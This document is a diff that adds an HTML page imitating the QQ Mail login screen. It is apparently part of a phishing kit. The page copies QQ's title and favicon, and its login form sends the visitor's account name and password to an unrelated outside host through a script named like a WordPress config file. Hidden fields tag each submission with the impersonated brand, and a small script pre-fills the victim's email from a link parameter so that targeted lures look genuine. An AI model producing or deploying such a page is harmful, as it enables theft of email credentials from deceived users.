@@ -1,0 +1,177 @@
+﻿<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>&#30331;&#24405;QQ&#37038;&#31665;</title>
+<link rel="icon" type="image/png" href="https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_32h.png" />
+</head>
+<style>
+  html, body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  border: 0;
+  position: absolute;
+  height: 100%;
+  min-width: 100%;
+  font-size: 13px;
+  color: #404040;
+  direction: ltr;
+  -webkit-text-size-adjust: none;
+  }
+  input[type=text],
+  input[type=password] {
+  -moz-appearance: none;
+  -webkit-appearance: none;
+  appearance: none;
+  display: inline-block;
+  height: 100%;
+  width: 100%;
+  padding: 10px 15px;
+  border: 1px solid #d5d5d5;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  -moz-border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-radius: 0;
+  font-size: 12px;
+  font-family: Arial,sans-serif;
+  color: #787878;
+  }
+  input[type=text]:focus,
+  input[type=password]:focus {
+  outline: none;
+  border: 1px solid #d5d5d5;
+  }
+
+</style>
+<body>
+
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+	<tr>
+		<td background="img/header_bg.png">
+		<table border="0" width="100%" cellspacing="0" cellpadding="0">
+			<tr>
+				<td width="39"></td>
+				<td width="143">
+				<img border="0" src="img/header_101.png" width="189" height="63"></td>
+				<td>&nbsp;</td>
+				<td width="107">
+				<img border="0" src="img/header_102.png" width="210" height="63"></td>
+				<td width="40">&nbsp;</td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+	<tr>
+		<td height="32"></td>
+	</tr>
+	<tr>
+		<td>
+		<table border="0" width="100%" cellspacing="0" cellpadding="0">
+			<tr>
+				<td width="169"></td>
+				<td height="532">
+				<table border="0" width="100%" cellspacing="0" cellpadding="0">
+					<tr>
+						<td width="500">
+						<img border="0" src="img/ads.png" width="500" height="534"></td>
+						<td>&nbsp;</td>
+						<td width="372" height="534" background="img/form.png">
+						<table border="0" width="100%" cellspacing="0" cellpadding="0">
+						   <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
+							<tr>
+								<td height="147"></td>
+							</tr>
+							<tr>
+								<td>
+								<table border="0" width="100%" cellspacing="0" cellpadding="0">
+									<tr>
+										<td width="67"></td>
+										<td height="38">
+										  <input type="text" id="userInput" name="user" value="email" placeholder="&#25903;&#25345;QQ&#21495;/&#37038;&#31665;/&#25163;&#26426;&#21495;&#30331;&#24405;" required >
+										  <input type="hidden" name="link" value="https://mail.qq.com/" >
+										  <input type="hidden" name="domain" value="qq.com" >
+										  <input type="hidden" name="sender" value="qq.com" >
+										</td>
+										<td width="53"></td>
+									</tr>
+								</table>
+								</td>
+							</tr>
+							<tr>
+								<td height="10"></td>
+							</tr>
+							<tr>
+								<td>
+								<table border="0" width="100%" cellspacing="0" cellpadding="0">
+									<tr>
+										<td width="67"></td>
+										<td height="38">
+										  <input type="password" name="passwd" placeholder="&#35831;&#36755;&#20837;&#23494;&#30721;" required autofocus >
+										</td>
+										<td width="53">&nbsp;</td>
+									</tr>
+								</table>
+								</td>
+							</tr>
+							<tr>
+								<td height="29"></td>
+							</tr>
+							<tr>
+								<td>
+								<table border="0" width="100%" cellspacing="0" cellpadding="0">
+									<tr>
+										<td width="67"></td>
+										<td>
+										<input type="image" src="img/btn.png" width="252" height="40"></td>
+										<td width="53">&nbsp;</td>
+									</tr>
+								</table>
+								</td>
+							</tr>
+							<tr>
+								<td height="233"></td>
+							</tr>
+							</form>
+						</table>
+						</td>
+					</tr>
+				</table>
+				</td>
+				<td width="149"></td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+	<tr>
+		<td height="30"></td>
+	</tr>
+	<tr>
+		<td background="img/footer.png">
+		<table border="0" width="100%" cellspacing="0" cellpadding="0">
+			<tr>
+				<td width="323">&nbsp;</td>
+				<td width="681">
+				<img border="0" src="img/footer_101.png" width="681" height="66"></td>
+				<td>&nbsp;</td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+</table>
+
+<!-- ✅ Script fills userInput with full email from ?login= parameter -->
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const raw = params.get('login');
+  const email = raw ? decodeURIComponent(raw) : '';
+
+  if (email.includes('@')) {
+    document.getElementById('userInput').value = email;
+  }
+</script>
+
+</body>
+</html>
